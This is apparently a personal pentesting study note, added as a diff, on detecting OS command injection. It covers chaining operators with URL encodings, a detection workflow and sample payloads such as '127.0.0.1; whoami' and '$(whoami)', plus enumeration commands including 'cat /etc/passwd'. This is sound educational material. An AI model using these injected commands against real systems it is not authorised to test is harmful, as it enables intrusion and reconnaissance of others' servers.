@@ -1,0 +1,390 @@
+# Command Injection – Detection
+
+## Overview
+
+Detecting OS Command Injection vulnerabilities usually follows the same process used to exploit them.
+
+We supply crafted input and observe whether:
+
+- additional commands execute
+- output changes unexpectedly
+- system command behaviour is altered
+- unintended results appear
+
+If application input is passed directly into system commands without proper sanitisation, command injection may be possible.
+
+Basic command injection occurs when user input is inserted into system-level command execution functions such as:
+
+```
+system()
+exec()
+shell_exec()
+popen()
+Runtime.exec()
+Process.Start()
+child_process.exec()
+```
+
+Think of command injection as adding extra instructions to a sentence that the operating system will blindly follow.
+
+---
+
+# 1. Identifying Potential Injection Points
+
+Command injection commonly appears where user input interacts with system utilities.
+
+Typical examples:
+
+- ping utilities
+- traceroute tools
+- DNS lookup features
+- file search functionality
+- system diagnostic tools
+- network utilities
+- backup scripts
+- image processing tools
+
+Example application feature:
+
+```
+Host availability checker
+```
+
+User provides IP address:
+
+```
+127.0.0.1
+```
+
+Application returns:
+
+```
+1 packet transmitted, 1 received
+```
+
+Likely backend command:
+
+```bash
+ping -c 1 127.0.0.1
+```
+
+If input is not sanitised, attacker may inject additional commands.
+
+---
+
+# 2. Basic Injection Concept
+
+Application constructs command:
+
+```bash
+ping -c 1 USER_INPUT
+```
+
+If input is not filtered:
+
+```
+127.0.0.1; whoami
+```
+
+Command becomes:
+
+```bash
+ping -c 1 127.0.0.1; whoami
+```
+
+Result:
+
+- ping executes
+- whoami executes
+- command output returned
+
+Indicates injection vulnerability.
+
+---
+
+# 3. Observable Indicators of Command Injection
+
+Possible signs:
+
+- unexpected command output
+- multiple command outputs returned
+- system information disclosure
+- command execution delays
+- error messages from shell
+- output formatting changes
+- verbose error responses
+
+Example output change:
+
+```
+PING 127.0.0.1 ...
+
+www-data
+```
+
+Indicates additional command execution.
+
+---
+
+# 4. Common Injection Operators
+
+Operators allow chaining commands.
+
+These allow execution of multiple commands within a single input.
+
+| Operator | Function |
+|---------|----------|
+| ; | executes both commands sequentially |
+| && | executes second command if first succeeds |
+| \|\| | executes second command if first fails |
+| & | executes both commands (background execution) |
+| \| | pipes output from first command into second |
+| newline | executes next command on new line |
+| \` \` | executes command inside backticks |
+| $() | executes command inside subshell |
+
+---
+
+# 5. Injection Operator Reference
+
+| Operator Type | Character | URL Encoded | Behaviour |
+|--------------|----------|-------------|----------|
+| Semicolon | ; | %3b | executes both commands |
+| New line | \n | %0a | executes both commands |
+| Background | & | %26 | executes both |
+| Pipe | \| | %7c | passes output to next command |
+| AND | && | %26%26 | executes second if first succeeds |
+| OR | \|\| | %7c%7c | executes second if first fails |
+| Subshell | \`cmd\` | %60%60 | executes command |
+| Subshell | $(cmd) | %24%28%29 | executes command |
+
+---
+
+# 6. Example Injection Payloads
+
+Basic command injection test:
+
+```
+127.0.0.1; whoami
+```
+
+AND operator:
+
+```
+127.0.0.1 && whoami
+```
+
+OR operator:
+
+```
+127.0.0.1 || whoami
+```
+
+Pipe operator:
+
+```
+127.0.0.1 | whoami
+```
+
+Subshell:
+
+```
+127.0.0.1 $(whoami)
+```
+
+New line injection:
+
+```
+127.0.0.1
+whoami
+```
+
+---
+
+# 7. Linux vs Windows Operator Behaviour
+
+Most operators work across environments.
+
+Differences:
+
+| Operator | Linux | Windows CMD | PowerShell |
+|----------|-------|-------------|-----------|
+| ; | works | does not work | works |
+| && | works | works | works |
+| \|\| | works | works | works |
+| & | works | works | works |
+| \| | works | works | works |
+| $() | works | not supported | not supported |
+| backticks | works | not supported | supported differently |
+
+Important note:
+
+```
+; may not work in Windows CMD
+```
+
+But may work in PowerShell.
+
+---
+
+# 8. Basic Detection Methodology
+
+## Step 1 – identify input field
+
+Look for functionality interacting with system resources.
+
+Examples:
+
+- ping tool
+- file search
+- system status
+- DNS resolution
+- IP lookup
+
+## Step 2 – test normal input
+
+Example:
+
+```
+127.0.0.1
+```
+
+Observe expected output.
+
+## Step 3 – inject operator
+
+Example:
+
+```
+127.0.0.1; whoami
+```
+
+## Step 4 – observe output changes
+
+Look for additional command output.
+
+## Step 5 – confirm injection success
+
+Unexpected output confirms vulnerability.
+
+---
+
+# 9. Example Detection Workflow
+
+Input:
+
+```
+127.0.0.1
+```
+
+Possible backend command:
+
+```bash
+ping -c 1 127.0.0.1
+```
+
+Injection attempt:
+
+```
+127.0.0.1; id
+```
+
+Executed command:
+
+```bash
+ping -c 1 127.0.0.1; id
+```
+
+Output:
+
+```
+PING 127.0.0.1 ...
+
+uid=33(www-data)
+```
+
+Confirms command injection.
+
+---
+
+# 10. Useful Test Commands
+
+Basic enumeration commands:
+
+```bash
+whoami
+id
+uname -a
+hostname
+pwd
+```
+
+File system enumeration:
+
+```bash
+ls
+ls -la
+cat /etc/passwd
+```
+
+Windows equivalents:
+
+```cmd
+whoami
+ver
+dir
+type C:\Windows\win.ini
+```
+
+---
+
+# 11. Detection Tips
+
+Start with simple commands.
+
+Avoid noisy payloads early.
+
+Confirm command execution reliably.
+
+Observe response carefully.
+
+Test multiple operators.
+
+Test both success and failure scenarios.
+
+Example:
+
+```
+127.0.0.1 && whoami
+127.0.0.1 || whoami
+```
+
+Different behaviour may reveal filtering rules.
+
+---
+
+# 12. Key Takeaways
+
+- command injection occurs when user input is passed to system commands
+- output differences indicate possible injection
+- operators allow command chaining
+- detection and exploitation follow similar process
+- multiple operators should be tested
+- behaviour varies across operating systems
+- simple payloads are often sufficient for initial detection
+- input sanitisation failures lead directly to command execution risk
+
+---
+
+# Tags
+
+#command-injection
+#rce
+#input-validation
+#os-command-injection
+#pentesting
+#ctf
+#linux
+#windows
+#recon
+#obsidian
